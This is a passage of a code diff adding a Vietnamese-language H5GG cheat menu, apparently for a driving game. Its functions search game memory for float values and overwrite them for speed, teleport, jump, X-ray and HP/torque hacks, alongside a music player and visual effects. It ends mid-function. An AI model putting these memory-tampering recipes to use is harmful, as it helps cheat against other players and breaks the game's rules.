+        speed = parseFloat(speed);
+        if (isNaN(speed) || speed < 2 || speed > 30) {
+            alert("Giá trị không hợp lệ!");
+            return;
+        }
+        try {
+            h5gg.searchNumber('0.33333334327', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNearby('0.03999999911', 'F32', '0x800');
+            h5gg.searchNearby('1', 'F32', '0x800');
+            h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(speed.toString(), 'F32');
+            alert("Đã bật Game Speed, các tính năng đặc biệt khác đã tự động tắt");
+            gameSpeedEnabled = true;
+            specialFeatures.gameSpeed = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.editAll('1', 'F32');
+            h5gg.clearResults();
+            gameSpeedEnabled = false;
+            specialFeatures.gameSpeed = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== WALK SPEED ======================
+let walkSpeedEnabled = false;
+function toggleNewWalkSpeed() {
+    const btn = document.getElementById('walkspeed-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!walkSpeedEnabled) {
+        disableOtherSpecialFeatures('walkSpeed');
+        alert("Vui lòng xuống xe!");
+        let speed = prompt("Vui lòng nhập tốc độ đi bộ (2-50):");
+        if (speed === null) return;
+        speed = parseFloat(speed);
+        if (isNaN(speed) || speed < 2 || speed > 50) {
+            alert("Giá trị không hợp lệ!");
+            return;
+        }
+        try {
+            h5gg.searchNumber('0.33333334327', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNearby('0.03999999911', 'F32', '0x800');
+            h5gg.searchNearby('1', 'F32', '0x800');
+            h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(speed.toString(), 'F32');
+            alert("Đã bật Walk Speed, các tính năng đặc biệt khác đã tự động tắt");
+            walkSpeedEnabled = true;
+            specialFeatures.walkSpeed = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.editAll('1', 'F32');
+            h5gg.clearResults();
+            walkSpeedEnabled = false;
+            specialFeatures.walkSpeed = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== CAR SPEED ======================
+let carSpeedEnabled = false;
+function toggleSpeedHack() {
+    const btn = document.getElementById('carspeed-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!carSpeedEnabled) {
+        if (!confirm("Tính năng có thể lỗi, tuỳ thuộc vào thiết bị")) return;
+        disableOtherSpecialFeatures('carSpeed');
+        try {
+            h5gg.searchNumber('2500', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-31310.1310132013090213', 'F32');
+            h5gg.clearResults();
+            carSpeedEnabled = true;
+            specialFeatures.carSpeed = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('-31310.1310132013090213', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('2500', 'F32');
+            h5gg.clearResults();
+            carSpeedEnabled = false;
+            specialFeatures.carSpeed = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== CAR SPEED V2 ======================
+let carSpeedV2Enabled = false;
+function toggleCarSpeedV2() {
+    const btn = document.getElementById('carspeedv2-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!carSpeedV2Enabled) {
+        if (!confirm("Tính năng có thể lỗi, tuỳ thuộc vào thiết bị")) return;
+        disableOtherSpecialFeatures('carSpeedV2');
+        try {
+            h5gg.searchNumber('2500', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-99999999999999999999', 'F32');
+            h5gg.clearResults();
+            carSpeedV2Enabled = true;
+            specialFeatures.carSpeedV2 = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('-99999999999999999999', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('2500', 'F32');
+            h5gg.clearResults();
+            carSpeedV2Enabled = false;
+            specialFeatures.carSpeedV2 = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== GLITCH ======================
+let glitchEnabled = false;
+function toggleGlitch() {
+    const btn = document.getElementById('glitch-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!glitchEnabled) {
+        if (!confirm("Tính năng có thể lỗi, tuỳ thuộc vào thiết bị")) return;
+        disableOtherSpecialFeatures('glitch');
+        try {
+            for (let i = 0; i < 5; i++) {
+                h5gg.searchNumber('0.4', 'F32', '0x00000000', '0x200000000');
+            }
+            h5gg.editAll('-100.369735492', 'F32');
+            h5gg.clearResults();
+            glitchEnabled = true;
+            specialFeatures.glitch = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('-100.369735492', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('0.4', 'F32');
+            h5gg.clearResults();
+            glitchEnabled = false;
+            specialFeatures.glitch = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== TỰ ĐỘNG LÁI XE ======================
+let autoDriveEnabled = false;
+function toggleTuDongLaiXe() {
+    const btn = document.getElementById('autodrive-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!autoDriveEnabled) {
+        if (!confirm("Tính năng có thể lỗi, tuỳ thuộc vào thiết bị")) return;
+        disableOtherSpecialFeatures('autoDrive');
+        try {
+            for (let i = 0; i < 5; i++) {
+                h5gg.searchNumber('0.4', 'F32', '0x00000000', '0x200000000');
+            }
+            h5gg.editAll('-1.5873636363613102013', 'F32');
+            h5gg.clearResults();
+            autoDriveEnabled = true;
+            specialFeatures.autoDrive = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('-1.5873636363613102013', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('0.4', 'F32');
+            h5gg.clearResults();
+            autoDriveEnabled = false;
+            specialFeatures.autoDrive = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== MẤT KIỂM SOÁT ======================
+let outOfControlEnabled = false;
+function toggleOutOfControl() {
+    const btn = document.getElementById('outofcontrol-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!outOfControlEnabled) {
+        disableOtherSpecialFeatures('outOfControl');
+        try {
+            h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-5000.1310132013090213', 'F32');
+            h5gg.clearResults();
+            outOfControlEnabled = true;
+            specialFeatures.outOfControl = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('-5000.1310132013090213', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-9.8', 'F32');
+            h5gg.clearResults();
+            h5gg.searchNumber('-4500', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-9.8', 'F32');
+            h5gg.clearResults();
+            outOfControlEnabled = false;
+            specialFeatures.outOfControl = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== MẤT KIỂM SOÁT V2 ======================
+let outOfControlV2Enabled = false;
+function toggleOutOfControlV2() {
+    const btn = document.getElementById('outofcontrolv2-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!outOfControlV2Enabled) {
+        try {
+            h5gg.searchNumber('-8.5', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNumber('-8.5', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('12000', 'F32');
+            outOfControlV2Enabled = true;
+            btn.classList.add('active');
+            alert("Vui lòng tắt trước khi sử dụng tính năng khác, nhấn ga nếu không có phản ứng");
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.editAll('-8.5', 'F32');
+            h5gg.clearResults();
+            outOfControlV2Enabled = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== BẢN ĐỒ BIẾN THỂ ======================
+let mapVariantEnabled = false;
+function toggleMapVariant() {
+    const btn = document.getElementById('mapvariant-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!mapVariantEnabled) {
+        let confirmed = confirm("Vui lòng vào map để thấy sự thay đổi");
+        if (!confirmed) return;
+        try {
+            h5gg.searchNumber('0.75', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNumber('0.75', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNumber('0.75', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNumber('0.75', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('5.000124323', 'F32');
+            h5gg.clearResults();
+            mapVariantEnabled = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.searchNumber('5.000124323', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('0.75', 'F32');
+            h5gg.clearResults();
+            mapVariantEnabled = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== TELEPORT ======================
+let teleportEnabled = false;
+function toggleTeleport() {
+    const btn = document.getElementById('teleport-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!teleportEnabled) {
+        disableOtherSpecialFeatures('teleport');
+        if (!confirm("Lưu ý: Bay ngẫu hứng trên khắp bản đồ và tắt trước khi sử dụng tính năng khác")) return;
+        try {
+            h5gg.searchNumber('-8.5', 'F32', '0x00000000', '0x200000000');
+            h5gg.searchNumber('-8.5', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-10700', 'F32');
+            teleportEnabled = true;
+            specialFeatures.teleport = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    } else {
+        try {
+            h5gg.editAll('-8.5', 'F32');
+            h5gg.clearResults();
+            teleportEnabled = false;
+            specialFeatures.teleport = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== AIR WALK ======================
+let airWalkEnabled = false;
+function toggleAirWalk() {
+    const btn = document.getElementById('airwalk-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!airWalkEnabled) {
+        let confirmed = confirm("Vui lòng xuống xe");
+        if (!confirmed) return;
+        try {
+            h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('0.05', 'F32');
+            setTimeout(() => {
+                h5gg.editAll('0.1310132013090213', 'F32');
+                h5gg.clearResults();
+                alert("Đã bật đi bộ trên không, vui lòng chờ 10s để float hoạt động");
+            }, 1300);
+            airWalkEnabled = true;
+            btn.classList.add('active');
+        } catch (e) {
+            alert("Lỗi: " + e.message);
+        }
+    } else {
+        try {
+            h5gg.searchNumber('0.1310132013090213', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('-9.8', 'F32');
+            h5gg.clearResults();
+            airWalkEnabled = false;
+            btn.classList.remove('active');
+        } catch (e) {
+            alert("Lỗi: " + e.message);
+        }
+    }
+}
+
+// ====================== JUMP ======================
+let jumpEnabled = false;
+function toggleJump() {
+    const btn = document.getElementById('jump-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!jumpEnabled) {
+        try {
+            let count = h5gg.searchNumber('10000', 'F32', '0x00000000', '0x200000000');
+            while (count > 1000) {
+                h5gg.clearResults();
+                count = h5gg.searchNumber('10000', 'F32', '0x00000000', '0x200000000');
+            }
+            if (count === 0) { alert("Không tìm thấy giá trị"); return; }
+            h5gg.editAll('800000.1310132013090213', 'F32');
+            h5gg.clearResults();
+         
+            jumpEnabled = true;
+            btn.classList.add('active');
+        } catch (e) { alert("Lỗi: " + e.message); h5gg.clearResults(); }
+    } else {
+        try {
+            h5gg.searchNumber('800000.1310132013090213', 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll('10000', 'F32');
+            h5gg.clearResults();
+
+            jumpEnabled = false;
+            btn.classList.remove('active');
+        } catch (e) { alert("Lỗi: " + e.message); }
+    }
+}
+
+// ====================== MUSIC PLAYER ======================
+const audio = document.getElementById('musicPlayer');
+let songs = [];
+let currentSongIndex = 0;
+let loopMode = 'all';
+
+function togglePlay() {
+    if (audio.paused) {
+        audio.play();
+    } else {
+        audio.pause();
+    }
+}
+
+function handleMusicUpload(index) {
+    const fileInput = index === 0 ? document.getElementById('musicFile1') : document.getElementById('musicFile2');
+    const file = fileInput.files[0];
+    if (file && file.type === 'audio/mpeg') {
+        const url = URL.createObjectURL(file);
+        songs[index] = { url, name: file.name };
+        if (!audio.src || songs.length === 1) {
+            currentSongIndex = index;
+            audio.src = url;
+            document.getElementById('music-title').textContent = "Radio🎵 - " + file.name;
+            audio.play();
+        }
+    } else {
+        alert('Vui lòng chọn file .mp3 hợp lệ!');
+    }
+}
+
+function nextSong() {
+    if (songs.length === 0) return;
+    currentSongIndex = (currentSongIndex + 1) % songs.length;
+    if (songs[currentSongIndex]) {
+        audio.src = songs[currentSongIndex].url;
+        document.getElementById('music-title').textContent = "Radio🎵 - " + songs[currentSongIndex].name;
+        audio.play();
+    }
+}
+
+function updateLoopMode() {
+    loopMode = document.getElementById('loopMode').value;
+}
+
+audio.addEventListener('ended', function() {
+    if (loopMode === 'one') {
+        audio.currentTime = 0;
+        audio.play();
+    } else if (loopMode === 'all') {
+        nextSong();
+    }
+});
+
+// ====================== HIỆU ỨNG RƠI ======================
+const snowCanvas = document.getElementById('snow-canvas');
+const sakuraCanvas = document.getElementById('sakura-canvas');
+const snowCtx = snowCanvas.getContext('2d');
+const sakuraCtx = sakuraCanvas.getContext('2d');
+
+let width, height;
+function resize() {
+    width = snowCanvas.width = sakuraCanvas.width = window.innerWidth;
+    height = snowCanvas.height = sakuraCanvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resize);
+resize();
+
+class Snowflake {
+    constructor() { this.reset(); }
+    reset() {
+        this.x = Math.random() * width;
+        this.y = Math.random() * -height * 0.8;
+        this.size = Math.random() * 4 + 2;
+        this.speed = Math.random() * 1.2 + 0.5;
+        this.opacity = Math.random() * 0.4 + 0.6;
+        this.wind = Math.random() * 0.6 - 0.3;
+        this.rotation = Math.random() * Math.PI * 2;
+        this.rotationSpeed = (Math.random() - 0.5) * 0.02;
+    }
+    update() {
+        this.y += this.speed;
+        this.x += this.wind;
+        this.rotation += this.rotationSpeed;
+        this.wind += (Math.random() - 0.5) * 0.01;
+        this.wind = Math.max(-0.8, Math.min(0.8, this.wind));
+        if (this.y > height + 20) this.reset();
+    }
+    draw(ctx) {
+        ctx.save();
+        ctx.translate(this.x, this.y);
+        ctx.rotate(this.rotation);
+        ctx.globalAlpha = this.opacity;
+        ctx.beginPath();
+        ctx.fillStyle = '#ffffff';
+        ctx.arc(0, 0, this.size, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.beginPath();
+        ctx.moveTo(0, -this.size * 1.2);
+        ctx.lineTo(0, this.size * 1.2);
+        ctx.moveTo(-this.size * 1.2, 0);
+        ctx.lineTo(this.size * 1.2, 0);
+        ctx.strokeStyle = '#ffffff';
+        ctx.lineWidth = this.size * 0.3;
+        ctx.stroke();
+        ctx.restore();
+    }
+}
+
+const snowflakes = [];
+for(let i = 0; i < 120; i++) snowflakes.push(new Snowflake());
+
+function animateSnow() {
+    snowCtx.clearRect(0, 0, width, height);
+    snowflakes.forEach(s => { s.update(); s.draw(snowCtx); });
+    if (document.getElementById('snow-canvas').style.display !== 'none') {
+        requestAnimationFrame(animateSnow);
+    }
+}
+
+
+function changeTheme() {
+    const val = document.getElementById('themeSelect').value;
+    const menuContainer = document.querySelector('.menu-container');
+    const menuInner = document.querySelector('.menu-inner');
+    if (val === 'dark') {
+        menuContainer.style.background = 'linear-gradient(135deg, rgba(0,0,0,0.38), rgba(10,10,20,0.38))';
+        menuContainer.style.border = '1px solid rgba(255,255,255,0.22)';
+        menuInner.style.background = 'linear-gradient(135deg, rgba(0,0,0,0.38), rgba(10,10,20,0.38))';
+        menuInner.style.border = '1px solid rgba(255,255,255,0.22)';
+    } else {
+        menuContainer.style.background = 'linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38))';
+        menuContainer.style.border = '1px solid rgba(255,255,255,0.22)';
+        menuInner.style.background = 'linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38))';
+        menuInner.style.border = '1px solid rgba(255,255,255,0.22)';
+    }
+}
+
+// ====================== CÁC HÀM CUSTOM SETTING ======================
+function activateRaceHack() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+    try {
+        let proceed = confirm("vui lòng đi đến vạch đua xuất phát!");
+        if (!proceed) return;
+        h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+        let mode = prompt("Đua chế độ nào?\n 1: 402m\n2: 1600m");
+        if (mode === null) return;
+        h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll('-10000000', 'F32');
+        if (mode === "1") {
+            setTimeout(() => {
+                h5gg.editAll('-9.8', 'F32');
+                h5gg.clearResults();
+            }, 1200);
+        } else if (mode === "2") {
+            setTimeout(() => {
+                h5gg.editAll('-9.8', 'F32');
+                h5gg.clearResults();
+            }, 5000);
+        }
+    } catch (e) { alert("Lỗi: " + e.message); h5gg.clearResults(); }
+}
+
+function activateXrayGlass() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    let confirmed = confirm("Vui lòng để màn hình ở nơi chỉnh kính và kéo kính trong nhất có thể!");
+    if (!confirmed) return;
+
+    try {
+        let count = 0;
+        for (let i = 0; i < 5; i++) {
+            count = h5gg.searchNumber('0.3', 'F32', '0x00000000', '0x200000000');
+            if (count === 0) {
+                h5gg.clearResults();
+                alert("Không tìm thấy giá trị 0.3 ở lần search thứ " + (i+1));
+                return;
+            }
+        }
+
+        h5gg.editAll('3', 'F32');
+        h5gg.clearResults();
+
+        alert("Thay đổi màu kính thành công! Chỉ có thể thấy kính Xquang khi ở trong map.");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi khi thực hiện Kính Xquang: " + e.message);
+    }
+}
+
+function activateChangeHP() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    let confirmed = confirm("Vui lòng vào map và để màn hình ở phần hp");
+    if (!confirmed) return;
+
+    let choice = prompt("Bạn muốn buff hp nào?\n1: 414hp\n2: 300hp\n3: 1hp\n4: 1511hp (Glitch)\n5: 313hp\n6: 1700hp", "1");
+    if (choice !== "1" && choice !== "2" && choice !== "3" && choice !== "4" && choice !== "5" && choice !== "6") {
+        alert("Lựa chọn không hợp lệ!");
+        return;
+    }
+
+    let targetHP, nextHP, targetNM, nextNM;
+
+    if (choice === "1") {
+        targetHP = 414;
+        nextHP = 8000;
+        targetNM = 2300;
+        nextNM = 7998;
+    } else if (choice === "2") {
+        targetHP = 300;
+        nextHP = 8000;
+        targetNM = 2300;
+        nextNM = 7998;
+    } else if (choice === "3") {
+        targetHP = 1;
+        nextHP = 8000;
+        targetNM = 2300;
+        nextNM = 7998;
+    } else if (choice === "4") {
+        targetHP = 1511;
+        nextHP = 2022;
+        targetNM = 2259;
+        nextNM = 2011;
+    } else if (choice === "5") {
+        targetHP = 313;
+        nextHP = 8000;
+        targetNM = 2300;
+        nextNM = 7998;
+    } else if (choice === "6") {
+        targetHP = 1700;
+        nextHP = 7000;
+        targetNM = 2255;
+        nextNM = 3500;
+    }
+
+    try {
+        let currentHP = prompt("Hãy nhập số hp hiện tại.");
+        if (currentHP === null) return;
+        h5gg.searchNumber(currentHP, 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll(targetHP, 'F32');
+        h5gg.clearResults();
+
+        let nextToHP = prompt("Hãy nhập số kế bên hp.");
+        if (nextToHP === null) return;
+        h5gg.searchNumber(nextToHP, 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll(nextHP, 'F32');
+        h5gg.clearResults();
+
+        let currentNM = prompt("Hãy nhập torque hiện tại.");
+        if (currentNM === null) return;
+        h5gg.searchNumber(currentNM, 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll(targetNM, 'F32');
+        h5gg.clearResults();
+
+        let nextToNM = prompt("Hãy nhập số kế bên torque.");
+        if (nextToNM === null) return;
+        h5gg.searchNumber(nextToNM, 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll(nextNM, 'F32');
+        h5gg.clearResults();
+
+        alert("Đã thay đổi hp thành công!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi khi thay đổi hp: " + e.message);
+    }
+}
+
+// ====================== HP V2 WITH SAVING ======================
+let hpPresets = JSON.parse(localStorage.getItem('hpPresetsV2')) || [];
+
+function saveHPPreset(name, choice, currentHP, nextToHP, currentNM, nextToNM) {
+    hpPresets.push({
+        name: name,
+        choice: choice,
+        currentHP: currentHP,
+        nextToHP: nextToHP,
+        currentNM: currentNM,
+        nextToNM: nextToNM
+    });
+    localStorage.setItem('hpPresetsV2', JSON.stringify(hpPresets));
+}
+
+function deleteHPPreset(index) {
+    hpPresets.splice(index, 1);
+    localStorage.setItem('hpPresetsV2', JSON.stringify(hpPresets));
+}
+
+function showHPPresets() {
+    if (hpPresets.length === 0) {
+        return "Chưa có HP đã lưu nào.";
+    }
+    let list = "";
+    hpPresets.forEach((p, i) => {
+        list += `${i+1}. ${p.name} (${p.currentHP} hp)\n`;
+    });
+    return list;
+}
+
+function activateHPv2() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    let confirmed = confirm("Vui lòng vào map và để màn hình ở phần hp");
+    if (!confirmed) return;
+
+    let hpChoice = prompt("Chọn:\n1. Bắt đầu thay đổi hp\n2. Xem HP đã lưu\n3. Thêm hp mới vào danh sách", "1");
+    if (hpChoice === null) return;
+
+    let targetHP, nextHP, targetNM, nextNM, selectedChoice, currentHPVal, nextToHPVal, currentNMVal, nextToNMVal;
+
+    if (hpChoice === "1") {
+        let choice = prompt("Bạn muốn buff hp nào?\n1: 414hp\n2: 300hp\n3: 1hp\n4: 1511hp (Glitch)\n5: 313hp\n6: 1700hp", "1");
+        if (choice !== "1" && choice !== "2" && choice !== "3" && choice !== "4" && choice !== "5" && choice !== "6") {
+            alert("Lựa chọn không hợp lệ!");
+            return;
+        }
+        selectedChoice = choice;
+
+        if (choice === "1") {
+            targetHP = 414; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "2") {
+            targetHP = 300; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "3") {
+            targetHP = 1; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "4") {
+            targetHP = 1511; nextHP = 2022; targetNM = 2259; nextNM = 2011;
+        } else if (choice === "5") {
+            targetHP = 313; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "6") {
+            targetHP = 1700; nextHP = 7000; targetNM = 2255; nextNM = 3500;
+        }
+
+        try {
+            currentHPVal = prompt("Hãy nhập số hp hiện tại.");
+            if (currentHPVal === null) return;
+            h5gg.searchNumber(currentHPVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(targetHP, 'F32');
+            h5gg.clearResults();
+
+            nextToHPVal = prompt("Hãy nhập số kế bên hp.");
+            if (nextToHPVal === null) return;
+            h5gg.searchNumber(nextToHPVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(nextHP, 'F32');
+            h5gg.clearResults();
+
+            currentNMVal = prompt("Hãy nhập torque hiện tại.");
+            if (currentNMVal === null) return;
+            h5gg.searchNumber(currentNMVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(targetNM, 'F32');
+            h5gg.clearResults();
+
+            nextToNMVal = prompt("Hãy nhập số kế bên torque.");
+            if (nextToNMVal === null) return;
+            h5gg.searchNumber(nextToNMVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(nextNM, 'F32');
+            h5gg.clearResults();
+
+            alert("Đã thay đổi hp thành công!");
+        } catch (e) {
+            h5gg.clearResults();
+            alert("Lỗi khi thay đổi hp: " + e.message);
+            return;
+        }
+
+        if (confirm("Bạn có muốn lưu HP này cho những lần sau không?")) {
+            let presetName = prompt("Nhập tên cho HP đã lưu này:");
+            if (presetName && presetName.trim() !== "") {
+                saveHPPreset(presetName.trim(), selectedChoice, currentHPVal, nextToHPVal, currentNMVal, nextToNMVal);
+                alert("Đã lưu HP thành công với tên: " + presetName);
+            }
+        }
+    } else if (hpChoice === "3") {
+        // Add new without applying
+        let choice = prompt("Bạn muốn buff hp nào?\n1: 414hp\n2: 300hp\n3: 1hp\n4: 1511hp (Glitch)\n5: 313hp\n6: 1700hp", "1");
+        if (choice !== "1" && choice !== "2" && choice !== "3" && choice !== "4" && choice !== "5" && choice !== "6") {
+            alert("Lựa chọn không hợp lệ!");
+            return;
+        }
+        selectedChoice = choice;
+
+        if (choice === "1") {
+            targetHP = 414; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "2") {
+            targetHP = 300; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "3") {
+            targetHP = 1; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "4") {
+            targetHP = 1511; nextHP = 2022; targetNM = 2259; nextNM = 2011;
+        } else if (choice === "5") {
+            targetHP = 313; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (choice === "6") {
+            targetHP = 1700; nextHP = 7000; targetNM = 2255; nextNM = 3500;
+        }
+
+        currentHPVal = prompt("Hãy nhập số hp hiện tại.");
+        if (currentHPVal === null) return;
+
+        nextToHPVal = prompt("Hãy nhập số kế bên hp.");
+        if (nextToHPVal === null) return;
+
+        currentNMVal = prompt("Hãy nhập torque hiện tại.");
+        if (currentNMVal === null) return;
+
+        nextToNMVal = prompt("Hãy nhập số kế bên torque.");
+        if (nextToNMVal === null) return;
+
+        let presetName = prompt("Nhập tên cho HP đã lưu này:");
+        if (presetName && presetName.trim() !== "") {
+            saveHPPreset(presetName.trim(), selectedChoice, currentHPVal, nextToHPVal, currentNMVal, nextToNMVal);
+            alert("Đã thêm HP mới vào danh sách thành công!");
+        }
+    } else if (hpChoice === "2") {
+        let presetList = showHPPresets();
+        if (presetList === "Chưa có HP đã lưu nào.") {
+            alert(presetList);
+            return;
+        }
+        let presetSelect = prompt("HP đã lưu:\n" + presetList + "\n\nNhập số để chọn (0 để quay lại):");
+        if (presetSelect === null || presetSelect === "0") return;
+
+        let idx = parseInt(presetSelect) - 1;
+        if (isNaN(idx) || idx < 0 || idx >= hpPresets.length) {
+            alert("Lựa chọn không hợp lệ!");
+            return;
+        }
+
+        let action = prompt("1. Áp dụng HP này\n2. Xoá HP này\n3. Chỉnh sửa HP đã lưu");
+        if (action === null) return;
+
+        if (action === "2") {
+            if (confirm("Xác nhận xoá?")) {
+                deleteHPPreset(idx);
+                alert("Đã xoá HP đã lưu!");
+            }
+            return;
+        }
+
+        if (action === "3") {
+            // Edit saved
+            const preset = hpPresets[idx];
+            let newName = prompt("Nhập tên mới (hoặc giữ nguyên):", preset.name);
+            if (newName) preset.name = newName.trim();
+
+            let newCurrentHP = prompt("Nhập số hp hiện tại mới:", preset.currentHP);
+            if (newCurrentHP) preset.currentHP = newCurrentHP;
+
+            let newNextToHP = prompt("Nhập số kế bên hp mới:", preset.nextToHP);
+            if (newNextToHP) preset.nextToHP = newNextToHP;
+
+            let newCurrentNM = prompt("Nhập torque hiện tại mới:", preset.currentNM);
+            if (newCurrentNM) preset.currentNM = newCurrentNM;
+
+            let newNextToNM = prompt("Nhập số kế bên torque mới:", preset.nextToNM);
+            if (newNextToNM) preset.nextToNM = newNextToNM;
+
+            localStorage.setItem('hpPresetsV2', JSON.stringify(hpPresets));
+            alert("Đã chỉnh sửa HP đã lưu!");
+            return;
+        }
+
+        // Apply
+        const preset = hpPresets[idx];
+        selectedChoice = preset.choice;
+        currentHPVal = preset.currentHP;
+        nextToHPVal = preset.nextToHP;
+        currentNMVal = preset.currentNM;
+        nextToNMVal = preset.nextToNM;
+
+        if (selectedChoice === "1") {
+            targetHP = 414; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (selectedChoice === "2") {
+            targetHP = 300; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (selectedChoice === "3") {
+            targetHP = 1; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (selectedChoice === "4") {
+            targetHP = 1511; nextHP = 2022; targetNM = 2259; nextNM = 2011;
+        } else if (selectedChoice === "5") {
+            targetHP = 313; nextHP = 8000; targetNM = 2300; nextNM = 7998;
+        } else if (selectedChoice === "6") {
+            targetHP = 1700; nextHP = 7000; targetNM = 2255; nextNM = 3500;
+        }
+
+        try {
+            h5gg.searchNumber(currentHPVal, 'F32', '0x00000000', '0x200000000');
